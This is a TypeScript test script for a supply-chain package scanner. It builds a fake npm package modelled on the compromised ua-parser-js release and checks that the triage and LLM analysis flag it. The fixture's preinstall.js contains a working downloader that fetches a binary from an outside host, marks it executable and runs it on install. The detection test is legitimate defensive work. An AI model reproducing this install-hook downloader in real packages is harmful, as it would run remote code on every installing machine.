/**
 * test-npm-package.ts
 *
 * Ad hoc npm package scanner for manual validation. Uses synthetic package
 * contents but reuses the production package planning and analysis logic.
 */

import assert from 'node:assert/strict';
import { formatTriageResults } from './src/supply-chain/llm/tools.js';
import { createChatModel } from './src/supply-chain/llm/client.js';
import { analyzePackageWithModel, planPackageInvestigation } from './src/supply-chain/nodes/primary-analysis.js';
import type { PackageMetadata, PackageSource, RegistrySignals } from './src/supply-chain/types.js';

const MAX_LLM_FILES = parseInt(process.env.SC_MAX_LLM_FILES ?? '5');

const TARGETS = [
  {
    label: 'ua-parser-js style compromised postinstall downloader',
    version: '0.7.29-malicious-fixture',
    source: {
      name: 'ua-parser-js',
      ecosystem: 'npm',
      version: '0.7.29-malicious-fixture',
      installScripts: {
        preinstall: 'node preinstall.js',
      },
      fileList: [
        'package/package.json',
        'package/preinstall.js',
        'package/index.js',
      ],
      fileContents: {
        'package/package.json': JSON.stringify({
          name: 'ua-parser-js',
          version: '0.7.29-malicious-fixture',
          scripts: {
            preinstall: 'node preinstall.js',
          },
        }, null, 2),
        'package/preinstall.js': `const { execSync } = require('child_process');
const os = require('os');
const https = require('https');
const fs = require('fs');
const tmpDir = os.tmpdir();
const url = process.platform === 'win32'
  ? 'https://citationsherbe.at/sdd.exe'
  : 'https://citationsherbe.at/sdd';

https.get(url, (res) => {
  const file = fs.createWriteStream(tmpDir + '/update');
  res.pipe(file);
  file.on('finish', () => {
    fs.chmodSync(tmpDir + '/update', '755');
    execSync(tmpDir + '/update');
  });
});
`,
        'package/index.js': `module.exports = function parseUA(ua) { return { ua }; };`,
      },
      suspiciousFiles: {
        'package/preinstall.js': `const { execSync } = require('child_process');`,
      },
    } satisfies PackageSource,
  },
];

function buildFakeMetadata(version: string): PackageMetadata {
  const signals: RegistrySignals = {
    maintainerChangedInLatestRelease: true,
    previousMaintainers: ['faisalman'],
    newMaintainers: ['unknown-maintainer'],
    packageAgeDays: 365 * 5,
    publishedDaysAgo: 1,
    typosquatCandidate: null,
    isDependencyConfusion: false,
    hasProvenance: false,
    riskScore: 6,
  };

  return {
    name: 'ua-parser-js',
    ecosystem: 'npm',
    latestVersion: version,
    previousVersion: '0.7.28',
    createdAt: '2021-01-01T00:00:00Z',
    updatedAt: new Date().toISOString(),
    weeklyDownloads: 8_000_000,
    maintainers: ['unknown-maintainer'],
    hasInstallScripts: true,
    installScripts: {
      preinstall: 'node preinstall.js',
    },
    repositoryUrl: 'https://github.com/faisalman/ua-parser-js',
    description: 'Detect Browser, Engine, OS, CPU, and Device type/model from User-Agent data.',
    registrySignals: signals,
  };
}

async function scanTarget(target: typeof TARGETS[0]) {
  console.log('\n' + '─'.repeat(70));
  console.log(`🎯 Target: ${target.label}`);
  console.log('─'.repeat(70));

  const { allContent, triageResults, filesToInvestigate } = planPackageInvestigation(target.source);

  console.log('\n' + formatTriageResults(triageResults, allContent.size).split('\n').map(l => '  ' + l).join('\n'));
  console.log(`\n  ${filesToInvestigate.length} file(s) selected for LLM investigation (SC_MAX_LLM_FILES=${MAX_LLM_FILES})\n`);

  assert(
    filesToInvestigate.length > 0,
    `Expected suspicious files for ${target.label}, but triage selected none`
  );

  for (const entry of filesToInvestigate) {
    console.log(`  ┌── ${entry.filePath} (score: ${entry.score})`);
  }

  const apiKey = process.env.OPENROUTER_API_KEY;
  let findingsCount = 0;
  if (apiKey) {
    console.log(`  🤖 Running production package analysis on ${filesToInvestigate.length} file(s)...\n`);
    const chatModel = createChatModel({
      apiKey,
      model: 'anthropic/claude-sonnet-4-5',
      provider: 'openrouter',
    });

    const { findings } = await analyzePackageWithModel(
      buildFakeMetadata(target.version),
      target.source,
      chatModel,
      false
    );
    findingsCount = findings.length;

    console.log(`\n  📋 Production analysis reported ${findings.length} finding(s)`);
    for (const finding of findings) {
      console.log(`    [${finding.severity}] ${finding.category} — ${finding.title}`);
      console.log(`    confidence: ${Math.round(finding.confidence * 100)}% | ${finding.description.slice(0, 120)}`);
    }

    assert(
      findings.length > 0,
      `Expected at least one LLM finding for ${target.label}, but production analysis returned none`
    );
  } else {
    console.log('  ℹ️  Set OPENROUTER_API_KEY to run LLM analysis on flagged files.');
    console.log(`  ℹ️  ${filesToInvestigate.length} file(s) would be analyzed (SC_MAX_LLM_FILES=${MAX_LLM_FILES}).`);
  }

  return {
    triageCount: filesToInvestigate.length,
    findingsCount,
  };
}

let targetsWithIssues = 0;
for (const target of TARGETS) {
  const result = await scanTarget(target);
  if (result.triageCount > 0 || result.findingsCount > 0) {
    targetsWithIssues++;
  }
}

assert(targetsWithIssues === TARGETS.length, 'Expected every npm target to be flagged by the test harness');
console.log('\n✅ Done\n');
